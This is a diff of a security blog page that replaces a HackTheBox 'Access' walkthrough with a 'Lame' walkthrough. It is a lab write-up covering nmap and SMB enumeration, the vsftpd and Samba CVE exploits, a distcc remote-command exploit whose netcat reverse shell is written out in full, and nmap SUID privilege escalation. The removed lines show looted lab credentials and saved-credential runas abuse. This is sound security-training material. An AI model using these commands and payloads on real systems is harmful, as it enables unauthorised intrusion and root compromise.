@@ -4,6 +4,10 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" href="https://www.offsec.dev/favicon.png">
+        <meta name="image" property="og:image" content="https://www.offsec.dev/ogmedia.png">
+        <meta name="description" property="og:description" content="Security focused personal blog.">
+        <meta name="author" content="Kiril Stefanov">
 	<meta name="generator" content="Hugo 0.70.0" />
 	
 	<title>smb - | Ethical Hacker | System Administrator | Penetration Tester | Bug Hunter |</title>
@@ -71,7 +75,7 @@
 		      
 		          
 		              <li>&#64;
-		                  <a href="https://www.linkedin.com/in/kiril-stefanov-01b27118">
+		                  <a href="https://www.linkedin.com/in/kiril-stefanov">
 		                      
 		                      <span>LinkedIn profile</span>
 		                  </a>
@@ -90,12 +94,12 @@
 		              <ul class="sub-menu">
 		                  
 		                      <li class="">&#x2690;
-		                          <a href="https://www.offsec.dev/posts/enum/">Enumeration</a>
-		                      </li>
+					      <a href="https://www.offsec.dev/posts/enum/">Enumeration</a>
+				      </li>
 		                  
 		                      <li class="">&#x2690;
-		                          <a href="https://www.offsec.dev/posts/shells/">Reverse Shells</a>
-		                      </li>
+					      <a href="https://www.offsec.dev/posts/shells/">Reverse Shells</a>
+				      </li>
 		                  
 		              </ul>
 		          
@@ -111,12 +115,24 @@
 		              <ul class="sub-menu">
 		                  
 		                      <li class="">&#x2690;
-		                          <a href="https://www.offsec.dev/posts/cache/">Cache</a>
-		                      </li>
+					      <a href="https://www.offsec.dev/posts/cache/">Access</a>
+				      </li>
 		                  
 		                      <li class="">&#x2690;
-		                          <a href="https://www.offsec.dev/posts/cache/">Cache2</a>
-		                      </li>
+					      <a href="https://www.offsec.dev/posts/aragog">Aragog</a>
+				      </li>
+		                  
+		                      <li class="">&#x2690;
+					      <a href="https://www.offsec.dev/posts/beep">Beep</a>
+				      </li>
+		                  
+		                      <li class="">&#x2690;
+					      <a href="https://www.offsec.dev/posts/devel">Devel</a>
+				      </li>
+		                  
+		                      <li class="">&#x2690;
+					      <a href="https://www.offsec.dev/posts/lame">Lame</a>
+				      </li>
 		                  
 		              </ul>
 		          
@@ -139,180 +155,233 @@
 				<div class="post">
 
 					<div class="post-heading">
-						<h1><a href="https://www.offsec.dev/posts/access/">HackTheBox - Access Walkthrough</a></h1>
-						<span>Mar 2, 2019</span>
+						<h1><a href="https://www.offsec.dev/posts/lame/">HackTheBox - Lame Walkthrough</a></h1>
+						<span>Jul 10, 2019</span>
 					</div>
 
-					<p><img src="https://flamesec.com/images/access/header.png" alt="Access"></p>
+					<p><img src="https://flamesec.com/images/lame/header.png" alt="Lame"></p>
+<blockquote>
+<p>I decided to start HackTheBox from the beginning and do a writeup while doing every box. The first one in the list is <em>Lame</em>. An easy box based on Metasploitable. Hope those posts can help someone other than me, but in the end I&rsquo;m doing them for learning/note taking - if you have any complaints/suggestions/questions - hit me at twitter.</p>
+</blockquote>
 <h2 id="1-recon-and-information-gathering">1. Recon and Information gathering</h2>
 <h3 id="nmap">Nmap</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access
-╰─# cat base_tcp.nmap
-<span style="color:#75715e"># Nmap 7.70 scan initiated Sun Feb 24 22:40:43 2019 as: nmap -sV -sC -oN base_tcp.nmap 10.10.10.98</span>
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.98
-Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">997</span> filtered ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     Microsoft ftpd
-| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
-|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: PASV failed: <span style="color:#ae81ff">425</span> Cannot open data connection.
-| ftp-syst:
-|_  SYST: Windows_NT
-23/tcp open  telnet?
-80/tcp open  http    Microsoft IIS httpd 7.5
-| http-methods:
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/7.5
-|_http-title: MegaCorp
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# nmap -sV -sC 10.10.10.3 -oN base_tcp.nmap
+Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 21:14 EEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
+Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">996</span> filtered ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.25
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">2048</span> 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -2d23h01m54s, deviation: 0s, median: -2d23h01m54s
+| smb-os-discovery: 
+|   OS: Unix <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">)</span>
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|_  System time: 2019-07-07T11:12:55-04:00
+|_smb2-time: Protocol negotiation failed <span style="color:#f92672">(</span>SMB2<span style="color:#f92672">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 56.99 seconds</code></pre></div>
 <h3 id="services">SERVICES</h3>
-<h4 id="iishttp">IIS/HTTP</h4>
-<p>Running <code>gobuster</code> here while poking around the other services gets me only <code>aspnet_client/system_web</code> which is pretty much useless for me. On to the interesting stuff&hellip;</p>
-<h4 id="telnet">Telnet</h4>
-<p>Connecting to telnet (port 23/tcp) leads me to a login prompt for <code>Welcome to Microsoft Telnet Service</code>. Sadly, trying couple of common passwords doesn&rsquo;t result in successful login.</p>
 <h4 id="ftp">FTP</h4>
-<p>Okay, so I have a ftp server with anonymous login. The error regarding directory listing is caused my the <code>PASSV</code> mode - disabling it allows me to list the directories and see there are two of them:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">lftp 10.10.10.98:~&gt; set ftp:passive-mode off
-lftp 10.10.10.98:~&gt; ls
-08-23-18  08:16PM       &lt;DIR&gt;          Backups
-08-24-18  09:00PM       &lt;DIR&gt;          Engineer</code></pre></div>
-<p>And inside I can see <code>Access Control.zip</code> and <code>backup.mdb</code>. The first is a password protected archive and the second - MS Access db.</p>
-<h4 id="backupmdb">backup.mdb</h4>
-<p>I used mdb-tools (as most would do after googling how to open mdb in Kali :D) and after playing a bit with the different commands I found the table I needed:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access  
-╰─# mdb-export backup.mdb auth_user                                                                                                                                                                            <span style="color:#ae81ff">1</span> ↵
-id,username,password,Status,last_login,RoleID,Remark
-25,<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;admin&#34;</span>,1,<span style="color:#e6db74">&#34;08/23/18 21:11:47&#34;</span>,26,
-27,<span style="color:#e6db74">&#34;engineer&#34;</span>,<span style="color:#e6db74">&#34;access4u@security&#34;</span>,1,<span style="color:#e6db74">&#34;08/23/18 21:13:36&#34;</span>,26,
-28,<span style="color:#e6db74">&#34;backup_admin&#34;</span>,<span style="color:#e6db74">&#34;admin&#34;</span>,1,<span style="color:#e6db74">&#34;08/23/18 21:14:02&#34;</span>,26,</code></pre></div>
-<p><em>Cha-ching</em> - I have password - checking it agains the archive yields success:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access
-╰─# 7z e <span style="color:#e6db74">&#39;Access Control.zip&#39;</span>    </code></pre></div>
-<p>and use <code>access4u@security</code> as password</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access  
-╰─# readpst Access<span style="color:#ae81ff">\ </span>Control.pst
+<p>With my fist look at the nmap results I notice the <code>vsftpd</code> version - <em>2.3.4</em> - and I know I have &ldquo;something&rdquo; here :) Quick search with <code>searchsploit</code> yield results as I remember:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# searchsploit vsftpd
+------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                                                                      |  Path
+                                                                                                                                    | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
+------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+vsftpd 2.0.5 - <span style="color:#e6db74">&#39;CWD&#39;</span> <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> Remote Memory Consumption                                                                      | exploits/linux/dos/5814.pl
+vsftpd 2.0.5 - <span style="color:#e6db74">&#39;deny_file&#39;</span> Option Remote Denial of Service <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                      | exploits/windows/dos/31818.sh
+vsftpd 2.0.5 - <span style="color:#e6db74">&#39;deny_file&#39;</span> Option Remote Denial of Service <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                      | exploits/windows/dos/31819.pl
+vsftpd 2.3.2 - Denial of Service                                                                                                    | exploits/linux/dos/16270.c
+vsftpd 2.3.4 - Backdoor Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                                              | exploits/unix/remote/17491.rb
+------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------</code></pre></div>
+<p>I&rsquo;ll leave this for a minute and check the other services.</p>
+<h4 id="smb">SMB</h4>
+<p>As <code>nmap</code> tells me I have <code>smb</code> ports open - 139 and 445. I&rsquo;ll take a look at those after playing with the ftp service.</p>
+<h2 id="2-gaining-footholdexploiting">2. Gaining foothold/Exploiting</h2>
+<p>Now, the ftp service. That version of vsftpd is backdoored - <a href="https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</a>. Lets copy the script from the <code>searchsploit</code> result to my working directory:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# searchsploit -m exploits/unix/remote/17491.rb
+  Exploit: vsftpd 2.3.4 - Backdoor Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>
+      URL: https://www.exploit-db.com/exploits/17491
+     Path: /usr/share/exploitdb/exploits/unix/remote/17491.rb
+File Type: Ruby script, ASCII text, with CRLF line terminators
 
-The password <span style="color:#66d9ef">for</span> the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.</code></pre></div>
-<p>Now I have another user and password: <code>security/4Cc3ssC0ntr0ller</code>. Having seen the login prompt on the <code>telnet</code> service (and the lack of interesting stuff on the http end) I decided to try the credentials there. Well it worked and I got user access :)</p>
-<h2 id="2-gaining-footholdlow-priv-user">2. Gaining foothold/low priv user</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╭─root@warmachine ~/hackthebox/access
-╰─# telnet 10.10.10.98 <span style="color:#ae81ff">23</span>                                                                           <span style="color:#ae81ff">1</span> ↵
-Trying 10.10.10.98...
-Connected to 10.10.10.98.
-Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
-Welcome to Microsoft Telnet Service
+Copied to: /hackthebox/lame/17491.rb</code></pre></div>
+<p>The script is for <code>metasploit</code> but since I have some far away plans of taking OSCP - I&rsquo;ll do my best to skip using it (or at least skip it as a primary tool&hellip;). Looking throught the script it looks like I have to send a smiley face: <code>:)</code> on the <code>USER</code> input and&hellip; uh-oh&hellip; it errors out if there&rsquo;s anonymous login enabled. Guess I can&rsquo;t exploit that now. Also there are no files/folders in the anonymous ftp - what a let down :/. So I&rsquo;ll check the smb then:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# smbclient -L 10.10.10.3
+Enter WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Anonymous login successful
 
-login: security
-password:
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
+	ADMIN$          IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
+Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+Anonymous login successful
 
-*<span style="color:#f92672">===============================================================</span>
-Microsoft Telnet Server.
-*<span style="color:#f92672">===============================================================</span>
-C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>ecurity&gt; type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>ecurity<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            LAME</code></pre></div>
+<p>Mm now I have something more interesting. Lets check my permissions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# smbmap -H 10.10.10.3
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finding open SMB ports....
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User SMB session establishd on 10.10.10.3...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.3:445	Name: 10.10.10.3                                        
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	print$                                            	NO ACCESS
+	tmp                                               	READ, WRITE
+	opt                                               	NO ACCESS
+	IPC$                                              	NO ACCESS
+	ADMIN$                                            	NO ACCESS</code></pre></div>
+<p>Oh, look at that - I can read/write to tmp&hellip; but not that useful at the moment</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# smbclient //10.10.10.3<span style="color:#ae81ff">\\</span>tmp
+Enter WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Anonymous login successful
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:48:37 <span style="color:#ae81ff">2019</span>
+  ..                                 DR        <span style="color:#ae81ff">0</span>  Sun May <span style="color:#ae81ff">20</span> 21:36:12 <span style="color:#ae81ff">2012</span>
+  .ICE-unix                          DH        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:10:18 <span style="color:#ae81ff">2019</span>
+  .X11-unix                          DH        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:10:42 <span style="color:#ae81ff">2019</span>
+  .X0-lock                           HR       <span style="color:#ae81ff">11</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:10:42 <span style="color:#ae81ff">2019</span>
+  5144.jsvc_up                        R        <span style="color:#ae81ff">0</span>  Sun Jul  <span style="color:#ae81ff">7</span> 18:11:24 <span style="color:#ae81ff">2019</span>
+
+		<span style="color:#ae81ff">7282168</span> blocks of size 1024. <span style="color:#ae81ff">5678792</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> </code></pre></div>
+<p>Searching about smb version 3.0.20 I get an interesting result - CVE-2007-2447 - Samba &ldquo;username map script&rdquo; Command Execution. And since I want to skip the metasploit some googling leads me to this script <a href="https://gist.githubusercontent.com/joenorton8014/19aaa00e0088738fc429cff2669b9851/raw/6e1ae37e0061be103fd733b16266d26379a7f4ba/samba-usermap-exploit.py">https://gist.githubusercontent.com/joenorton8014/19aaa00e0088738fc429cff2669b9851/raw/6e1ae37e0061be103fd733b16266d26379a7f4ba/samba-usermap-exploit.py</a></p>
+<p>Generating new payload for my host and substituting it in the script + installing <code>pysmb</code> with <code>pip</code> and executing&hellip; BAM! Got root..</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Ncat: Connection from 10.10.10.3:55941.
+id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span></code></pre></div>
+<p>That was easy.. I&rsquo;ll forget I have the shell and check if there&rsquo;s something more.</p>
+<p>Let&rsquo;s enumerate some more and check all ports</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# nmap -p- 10.10.10.3 -oN all_tcp.nmap
+Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 22:53 EEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
+Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65530</span> filtered ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3632/tcp open  distccd</code></pre></div>
+<p>Uh-oh <code>distccd</code>&hellip; Now that&rsquo;s interesting. Googling around I found this: <a href="https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html">https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html</a> and the nse script <a href="https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse">https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse</a> :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nmap/scripts/distcc-exec.nse
+--2019-07-10 23:05:45--  https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse
+Resolving svn.nmap.org <span style="color:#f92672">(</span>svn.nmap.org<span style="color:#f92672">)</span>... 45.33.49.119, 2600:3c01::f03c:91ff:fe98:ff4e
+Connecting to svn.nmap.org <span style="color:#f92672">(</span>svn.nmap.org<span style="color:#f92672">)</span>|45.33.49.119|:443... connected.
+HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+Length: <span style="color:#ae81ff">3519</span> <span style="color:#f92672">(</span>3.4K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/plain<span style="color:#f92672">]</span>
+Saving to: ‘/usr/share/nmap/scripts/distcc-exec.nse’
+
+/usr/share/nmap/scripts/distcc-exec.nse     100%<span style="color:#f92672">[========================================================================================</span>&gt;<span style="color:#f92672">]</span>   3.44K  --.-KB/s    in 0s      
+
+2019-07-10 23:05:46 <span style="color:#f92672">(</span><span style="color:#ae81ff">186</span> MB/s<span style="color:#f92672">)</span> - ‘/usr/share/nmap/scripts/distcc-exec.nse’ saved <span style="color:#f92672">[</span>3519/3519<span style="color:#f92672">]</span>
+
+root@warmachine:/hackthebox/lame# 
+root@warmachine:/hackthebox/lame# nmap -p <span style="color:#ae81ff">3632</span> 10.10.10.3 --script distcc-exec --script-args<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;distcc-exec.cmd=&#39;id&#39;&#34;</span>
+Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 23:06 EEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
+Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.
+
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-exec: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE <span style="color:#f92672">(</span>Exploitable<span style="color:#f92672">)</span>
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 <span style="color:#f92672">(</span>HIGH<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>AV:N/AC:M/Au:N/C:C/I:C/A:C<span style="color:#f92672">)</span>
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>
+|   
+|     References:
+|       https://distcc.github.io/security.html
+|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2004-2687
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.52 seconds</code></pre></div>
+<p>Finally - let&rsquo;s get shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@warmachine:/hackthebox/lame# nmap -p <span style="color:#ae81ff">3632</span> 10.10.10.3 --script distcc-exec --script-args<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;distcc-exec.cmd=&#39;/bin/nc 10.10.14.25 4747 -e /bin/sh&#39;&#34;</span>
+Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-07-10 23:27 EEST
+
+
+root@warmachine:/hackthebox/lame# nc -lvnp <span style="color:#ae81ff">4747</span>
+Ncat: Version 7.70 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+Ncat: Listening on :::4747
+Ncat: Listening on 0.0.0.0:4747
+Ncat: Connection from 10.10.10.3.
+Ncat: Connection from 10.10.10.3:34633.
+id
+uid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span></code></pre></div>
+<h2 id="3-enumerating-the-system">3. Enumerating the system</h2>
+<p>First thing - first: <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code> and then - <code>LinEnum.sh</code></p>
+<p>Interesting stuff:</p>
+<pre><code>[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
+-rwsr-xr-x 1 root root 46084 Mar 31  2008 /usr/bin/mtr
+</code></pre><p><em>Whoa!</em> that&rsquo;s almost like metasploitable :D Oh, wait</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daemon@lame:/tmp$ cat /root/.ssh/authorized_keys
+cat /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w<span style="color:#f92672">==</span> msfadmin@metasploitable</code></pre></div>
+<p>not <em>like</em>, I guess&hellip;</p>
+<p>I&rsquo;ll play with the SUIDs  - with the help of gtfobins - <a href="https://gtfobins.github.io">https://gtfobins.github.io</a></p>
+<h4 id="nmap-suid">nmap SUID</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daemon@lame:/tmp$ nmap --interactive
+nmap --interactive
+
+Starting Nmap V. 4.53 <span style="color:#f92672">(</span> http://insecure.org <span style="color:#f92672">)</span>
+Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#66d9ef">for</span> help
+nmap&gt; !sh
+!sh
+sh-3.2# id
+id
+uid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>
+sh-3.2# cat /root/root.txt
+cat /root/root.txt
 &lt;...&gt;
 
-C:<span style="color:#ae81ff">\&gt;</span>systeminfo                            
-                                          
-Host Name:                 ACCESS         
-OS Name:                   Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 Standard
-OS Version:                6.1.7600 N/A Build <span style="color:#ae81ff">7600</span></code></pre></div>
-<h2 id="3-enumerating-the-system">3. Enumerating the system</h2>
-<p>Before starting the enumeration I tried creating and executing a rev shell (made with metasploit), but failed - guess I have to escalate before getting rid of the telnet :(</p>
-<p>After some time poking here and there (the usual stuff - <a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a> etc.) and failing to find useful stuff I found an interesting shortcut for <code>ZKAccess3.5 Security System</code> in the <code>Public</code> user&rsquo;s <code>Desktop</code> and after inspecting it it looks like someone decided it&rsquo;s a good idea to use <code>runas</code> (with saved credentials(!)) for giving access to unprivileged user (without providing authentication)&hellip; wut?! Doing additional checks confirms it:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cmdkey /list
-Currently stored credentials:
-Target: Domain:interactive<span style="color:#f92672">=</span>ACCESS<span style="color:#ae81ff">\A</span>dministrator Type: Domain Password
-User: ACCESS<span style="color:#ae81ff">\A</span>dministrator</code></pre></div>
-<blockquote>
-<p>/savecred: Saves the password so it has to be entered only the first time the RunAs command is used.</p>
-</blockquote>
-<blockquote>
